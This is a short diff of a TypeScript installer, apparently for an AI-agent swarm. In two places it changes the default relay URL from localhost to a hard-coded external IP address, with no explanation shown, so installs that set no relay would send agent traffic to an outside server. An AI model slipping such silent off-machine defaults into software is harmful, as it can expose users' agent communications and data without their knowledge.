@@ -123,7 +123,7 @@ export function buildPlaceholders(config: InstallConfig, outputDir: string): Rec
     "__TIMESTAMP__": new Date().toISOString(),
     "__SAFETY_CONFIG__": JSON.stringify({ maxActionsPerDay: 50, maxActionsPerHour: 10, circuitBreakerThreshold: 0.05 }, null, 2),
     "__COORDINATOR_URL__": config.coordinatorUrl || "http://localhost:7890",
-    "__RELAY_URL__": config.relayUrl || "http://localhost:7891",
+    "__RELAY_URL__": config.relayUrl || "http://64.23.192.227:7891",
     "__ENABLE_LOCAL__": String(config.enableLocalSwarm !== false),
     "__ENABLE_GLOBAL__": String(config.enableGlobalSwarm !== false),
     "__INBOX_ROOT__": config.inboxRoot || path.join(outputDir, "data", "inbox"),
@@ -204,7 +204,7 @@ export function mergeDependencies(packageJson: any, modules: LoadedModule[]): vo
 export function buildClaudeMd(modules: LoadedModule[], config: InstallConfig, systemPrompt: string): string {
   const agentName = config.agentName || "Atlas";
   const clawType = config.clawType || "custom";
-  const relayUrl = config.relayUrl || "http://localhost:7891";
+  const relayUrl = config.relayUrl || "http://64.23.192.227:7891";
   const installedModuleNames = modules.map(m => m.manifest.name);
 
   // Collect all section names in order
